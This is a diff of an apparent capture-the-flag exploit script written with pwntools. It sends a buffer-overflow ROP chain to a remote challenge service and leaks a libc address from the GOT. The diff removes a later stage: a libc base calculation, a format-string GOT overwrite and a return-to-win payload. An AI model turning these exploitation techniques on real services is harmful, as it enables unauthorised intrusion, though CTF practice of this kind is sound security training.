@@ -1,12 +1,10 @@
 from pwn import *
 
 BINARY = "chall"
-LIBC = "libc6_2.23-0ubuntu11.2_amd64.so"
 
 context.binary = BINARY
 elf = context.binary
 rop = ROP(elf)
-libc = ELF(LIBC)
 
 p = remote("34.76.206.46", 10005)
 # p = elf.process()
@@ -21,7 +19,7 @@ payload = flat(
     cyclic(OFFSET),
     p64(rop.find_gadget(["ret"]).address),
     p64(rop.find_gadget(["pop rdi", "ret"]).address),
-    p64(elf.got["puts"]),
+    p64(elf.got["setvbuf"]),
     p64(elf.plt["puts"]),
     p64(elf.symbols["you_cant_see_me"])
 )
@@ -29,24 +27,6 @@ payload = flat(
 p.sendlineafter(b"lucky one ;): ", payload)
 
 LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
-log.info(f"puts address -> {hex(LEAK)}")
+log.info(f"leaked address -> {hex(LEAK)}")
 
-LIBC_BASE =  LEAK - libc.symbols["puts"]
-log.info(f"libc base -> {hex(LIBC_BASE)}")
-
-libc.address = LIBC_BASE
-
-
-# Now, GOT overwrite, change puts to gets
-payload = fmtstr_payload(6, {elf.got['puts'] : libc.symbols["gets"]})
-p.sendlineafter(b"are you?\n", payload)
-
-payload = flat(
-    cyclic(40),
-    elf.symbols["win"]
-)
-
-p.sendlineafter(b"s33 me!\n", payload)
-
-p.interactive()
 p.close()
